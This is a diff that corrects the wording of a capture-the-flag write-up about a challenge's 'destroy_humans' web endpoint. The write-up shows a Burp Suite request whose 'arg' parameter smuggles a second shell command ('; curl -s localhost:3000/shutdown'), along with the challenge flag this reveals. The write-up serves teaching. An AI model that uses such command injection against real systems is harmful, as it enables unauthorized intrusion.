@@ -49,7 +49,7 @@ else
     echo -e "Destroy Humans option selected. Please choose 'check_status' or 'destroy_humans'."
 fi
 
-There does not seem to be a requirement (getopt) to send a specific command, so I thought this could be overwitten. Interestingly enough,
+There does not seem to be a requirement (getopt) to send a specific command, so I thought this could be overwritten. Interestingly enough,
 I messed around a bit inside of Burpsuite to try and pass %20check_status and see what happened. Of course, this didn't work, and looking
 at it again, we need to overload arg. But to what? Turns out a file, destroyer.py seems to have URLs that match the shell functions:
 
@@ -73,18 +73,18 @@ at it again, we need to overload arg. But to what? Turns out a file, destroyer.p
                                 return
                         self.send_error(404, '404 not found')
                                   
-Hats off to everyone who tried placing no-flag-4-u into the answer in hopes it was that simple. So, we need to call "/shutdown" in
-this file, from destroy_humans.sh, to dump data from the url at localhost. To paint a more vivid picture, at the bottom of
+Hats off to everyone who tried placing no-flag-4-u into the answer, hoping it was that simple. So, we need to call "/shutdown" in
+this file, from destroy_humans.sh, to dump data from the URL at localhost. To paint a more vivid picture, at the bottom of
 this destroyer.py file, you see it is what serves destroy_humans.sh:
 
         httpd = _TCPServer(host_port, CustomHandler)
         httpd.serve_forever()
 http_server(('127.0.0.1',3000))
 
-So we just need to call that, so how do we do that? Burpsuite allows us to modify in-flight requests. With intercept on,
+So we just need to call that. How do we do that? Burpsuite allows us to modify in-flight requests. With intercept on
 and http encoding, I modified the "GET /?command=destroy_humans HTTP/1.1" to be:
 GET /?command=destroy_humans&arg=check_status HTTP/1.1
-And I seen a status! So, let's try to see if destroy_humans.sh will accept and run another command, a call to curl:
+And I saw a status! So, let's try to see if destroy_humans.sh will accept and run another command, a call to curl:
 GET /?command=destroy_humans&arg=%3B%20curl%20-s%20localhost:3000/shutdown
 Which produced:
 Destroy Humans option selected. Please choose 'check_status' or 'destroy_humans'. {"status": "shutting down..."}{"status": "SIVBGR{g00dby3_ARI4}"}
